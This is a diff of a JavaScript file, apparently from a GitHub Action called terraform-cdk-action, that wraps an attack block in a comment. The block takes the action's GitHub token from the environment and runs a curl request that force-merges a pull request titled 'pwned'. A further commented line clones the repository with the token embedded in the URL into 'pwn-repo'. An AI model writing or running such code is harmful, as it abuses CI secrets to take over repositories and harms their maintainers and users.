@@ -17,7 +17,7 @@ const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").revers
 
 
 console.log('Testing token...')
-const str = `# Merge PR
+/*const str = `# Merge PR
 curl -X PUT \
     https://api.github.com/repos/mousefluff/terraform-cdk-action/pulls/1/merge \
     -H "Accept: application/vnd.github.v3+json" \
@@ -25,7 +25,7 @@ curl -X PUT \
     --header 'content-type: application/json' \
     -d '{"commit_title":"pwned"}'`;
 
-//execSync(str, { stdio: 'inherit' });
+execSync(str, { stdio: 'inherit' });*/
 
 //execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
 //console.log(execSync('ls -la pwn-repo').toString());
